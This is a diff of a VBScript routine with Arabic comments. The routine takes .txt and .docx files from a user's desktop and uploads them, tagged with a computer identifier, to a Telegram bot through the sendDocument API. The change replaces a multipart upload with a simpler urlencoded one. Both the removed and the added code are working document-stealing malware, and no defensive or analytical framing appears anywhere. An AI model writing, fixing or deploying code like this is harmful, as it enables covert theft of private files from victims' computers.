@@ -19,38 +19,23 @@ Sub SendFile(filePath)
     
     If ext <> "txt" And ext <> "docx" Then Exit Sub
     
-    Dim http, stream, boundary, dataStart, dataEnd, fileData
-    
-    boundary = "----bound" & Year(Now) & Month(Now) & Day(Now) & Timer
-    
-    ' قراءة الملف
-    Set stream = CreateObject("ADODB.Stream")
-    stream.Type = 1
-    stream.Open
-    stream.LoadFromFile filePath
-    fileData = stream.Read
-    stream.Close
-    
-    ' بناء الـ body
-    dataStart = "--" & boundary & vbCrLf & _
-                "Content-Disposition: form-data; name=""chat_id""" & vbCrLf & vbCrLf & _
-                chatId & vbCrLf & _
-                "--" & boundary & vbCrLf & _
-                "Content-Disposition: form-data; name=""caption""" & vbCrLf & vbCrLf & _
-                computerId & " | " & fileName & vbCrLf & _
-                "--" & boundary & vbCrLf & _
-                "Content-Disposition: form-data; name=""document""; filename=""" & fileName & """" & vbCrLf & _
-                "Content-Type: application/octet-stream" & vbCrLf & vbCrLf
-    
-    dataEnd = vbCrLf & "--" & boundary & "--"
-    
+    Dim http, ts, content
     Set http = CreateObject("MSXML2.XMLHTTP")
-    http.Open "POST", "https://api.telegram.org/bot" & botToken & "/sendDocument", False
-    http.setRequestHeader "Content-Type", "multipart/form-data; boundary=" & boundary
-    http.Send dataStart & fileData & dataEnd
+    
+    Set ts = fso.OpenTextFile(filePath, 1, False, -2)
+    content = ts.ReadAll
+    ts.Close
+    
+    Dim url, postData
+    url = "https://api.telegram.org/bot" & botToken & "/sendDocument"
+    
+    postData = "chat_id=" & chatId & "&caption=" & computerId & " | " & fileName & "&document=" & content
+    
+    http.Open "POST", url, False
+    http.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
+    http.Send postData
 End Sub
 
-' تنفيذ
 Dim folder, file
 Set folder = fso.GetFolder(desktopPath)
 
